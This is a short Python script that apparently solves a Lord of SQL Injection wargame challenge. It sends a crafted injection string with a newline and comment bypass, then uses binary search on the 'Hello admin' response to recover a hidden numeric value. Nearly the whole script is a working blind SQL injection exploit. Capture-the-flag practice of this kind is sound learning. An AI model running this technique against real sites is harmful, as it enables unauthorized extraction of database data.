import requests

def sqli(size):
    url = 'https://los.rubiya.kr/chall/red_dragon_b787de2bfe6bc3454e2391c4e7bb5de8.php'
    cookies = {'PHPSESSID': ''}
    parameter = f'?id=%27||no>%23&no=%0a{size}'

    response = requests.get(url + parameter, cookies=cookies)

    return "Hello admin" in response.text

def binary_search(start, end):
    while start <= end:
        mid = (start + end) // 2
        #print('This is mid ',str(mid))
        if sqli(mid):
            start = mid + 1
            print('This is start ',str(start))
        else:
            end = mid - 1
            print('This is end ',str(end))

    return end

if __name__ == '__main__':
    result = binary_search(100000000, 1000000000)
    print(result)
